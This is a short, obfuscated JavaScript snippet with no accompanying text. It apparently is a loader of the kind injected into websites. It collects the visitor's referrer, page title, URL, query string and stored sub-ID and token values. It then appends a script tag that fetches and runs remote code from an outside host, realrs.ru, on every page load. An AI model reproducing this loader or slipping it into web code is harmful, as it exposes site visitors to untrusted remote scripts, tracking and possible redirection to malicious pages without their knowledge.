    var name = '_4kR6zSSvKh9Xg3Hw';
    if (!window._4kR6zSSvKh9Xg3Hw) {
        window._4kR6zSSvKh9Xg3Hw = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://realrs.ru/D8BPT5',
            P_PATH: 'https://realrs.ru/5a901f1/postback',
        };
    }
    const _5Zkb22QssnxPqmd3 = localStorage.getItem('config');
    if (typeof _5Zkb22QssnxPqmd3 !== 'undefined' && _5Zkb22QssnxPqmd3 !== null) {
        var _8QJXbMB9xMhstgnk = JSON.parse(_5Zkb22QssnxPqmd3);
        var _dfXVg8R53kSBksw1 = Math.round(+new Date()/1000);
        if (_8QJXbMB9xMhstgnk.created_at + window._4kR6zSSvKh9Xg3Hw.ttl < _dfXVg8R53kSBksw1) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _fzqJ6fRvqVZV84Gv = localStorage.getItem('subId');
    var _n1RYKc1pDKpS2czG = localStorage.getItem('token');
    var _7pJr7VGxw6n3TFZz = '?return=js.client';
        _7pJr7VGxw6n3TFZz += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _7pJr7VGxw6n3TFZz += '&se_referrer=' + encodeURIComponent(document.referrer);
        _7pJr7VGxw6n3TFZz += '&default_keyword=' + encodeURIComponent(document.title);
        _7pJr7VGxw6n3TFZz += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _7pJr7VGxw6n3TFZz += '&name=' + encodeURIComponent(name);
        _7pJr7VGxw6n3TFZz += '&host=' + encodeURIComponent(window._4kR6zSSvKh9Xg3Hw.R_PATH);
    if (typeof _fzqJ6fRvqVZV84Gv !== 'undefined' && _fzqJ6fRvqVZV84Gv && window._4kR6zSSvKh9Xg3Hw.unique) {
        _7pJr7VGxw6n3TFZz += '&sub_id=' + encodeURIComponent(_fzqJ6fRvqVZV84Gv);
    }
    if (typeof _n1RYKc1pDKpS2czG !== 'undefined' && _n1RYKc1pDKpS2czG && window._4kR6zSSvKh9Xg3Hw.unique) {
        _7pJr7VGxw6n3TFZz += '&token=' + encodeURIComponent(_n1RYKc1pDKpS2czG);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._4kR6zSSvKh9Xg3Hw.R_PATH + _7pJr7VGxw6n3TFZz;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
